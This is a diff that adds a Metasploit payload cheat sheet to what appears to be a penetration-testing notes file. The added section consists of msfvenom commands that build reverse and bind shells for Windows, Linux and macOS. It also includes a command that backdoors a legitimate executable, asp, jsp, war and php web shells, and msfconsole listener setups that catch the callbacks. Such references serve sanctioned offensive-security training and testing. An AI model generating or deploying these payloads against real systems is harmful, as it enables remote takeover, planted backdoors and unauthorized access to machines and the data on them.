@@ -26,6 +26,86 @@ ENUM USERS DOMAIN-CONTROLLER
 nmap -p88 --script krb5-enum-users --script-args krb5-enumusers.realm="cyberspacekittens.local",userdb=/opt/userlist.txt <Domain Controller IP>
 ```
 
+MSF-PAYLOAD
+```
+- msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python :: Windows
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe  :: Windows
+- msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py :: MAC OS X  - 100%
+- msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2 :: Mac OS X
+- msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.4  LPORT=4444 -f macho > osx_cam.dmg 
+- msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
+- msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+- msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+- msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=consulting.example.org LPORT=4443 > metasploit_https.exe
+
+
+[Establishing a Listener]
+
+- MSFCONSOLE
+    - use /exploit/multi/handler
+	- set payload windows/meterpreter/reverse_tcp
+	- set LHOST <IP>
+	- set LPORT 4444
+	- set ExitOnSession false
+	- exploit -j -z
+	- sessions -l
+	- sessions -i 2
+  
+  
+  - msfconsole -r msfremote_shell.rc
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <IP>
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
+Staged Payloads for Windows
+
+x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+Stageless Payloads for Windows
+
+x86	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+x64	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+Staged Payloads for Linux
+
+x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+x64	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+Stageless Payloads for Linux
+
+x86	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+x64	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+Non-Meterpreter Web Payloads
+asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+Meterpreter Binaries
+Staged Payloads for Windows
+
+x86	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+x64	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+Stageless Payloads for Windows
+
+x86	msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+x64	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+Staged Payloads for Linux
+
+x86	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+x64	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+Stageless Payloads for Linux
+
+x86	msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+x64	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+Meterpreter Web Payloads
+asp	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
+war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
+php	msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+```
+
 OTHER RESSOURCES
 ```
 https://github.com/R0B1NL1N/OSCP-note
